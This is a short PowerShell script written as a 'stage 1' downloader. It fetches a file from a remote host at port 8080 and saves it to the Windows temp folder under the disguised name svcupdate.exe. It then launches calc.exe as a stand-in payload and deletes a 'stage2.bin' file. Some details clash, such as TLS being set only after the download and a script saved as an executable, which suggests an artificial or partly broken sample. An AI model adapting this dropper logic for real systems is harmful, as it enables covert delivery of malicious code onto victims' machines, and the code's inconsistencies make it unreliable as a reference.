[CmdletBinding()]
param(
    [Parameter(Mandatory = $true)]
    [string]$FetchUrl = "http://contoso.com:8080/stage1.ps1",
    [string]$Stage2Path = "$env:TEMP\svcupdate.exe",
    [int]$ConnectionTimeout = 171
)
$ErrorActionPreference = "Stop"

function Invoke-Stage1Download {
    [CmdletBinding()]
    param(
        [string]$SourceUrl = "",
        [string]$DestinationPath = "",
        [int]$TimeoutSec = 45
    )

    Write-Verbose ("Fetching " + $SourceUrl)
    $ClientObject = New-Object System.Net.WebClient
    $ClientObject.Headers.Add("X-Transfer-Timeout", [string]$TimeoutSec)
    $ClientObject.DownloadFile($SourceUrl, $DestinationPath)
    return (Test-Path -Path $DestinationPath)
}

try {
    Write-Verbose "Beginning first stage"
    $TransferResult = Invoke-Stage1Download -SourceUrl $FetchUrl -DestinationPath $Stage2Path -TimeoutSec $ConnectionTimeout
    if ($TransferResult) {
        Start-Process -FilePath "calc.exe"
    }
}
catch {
    Write-Warning "Stage 1 retrieval failed: $($_.Exception.Message)"
}
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
Remove-Item -Path "$env:TEMP\stage2.bin" -Force
$StageMarker = "stage-28"
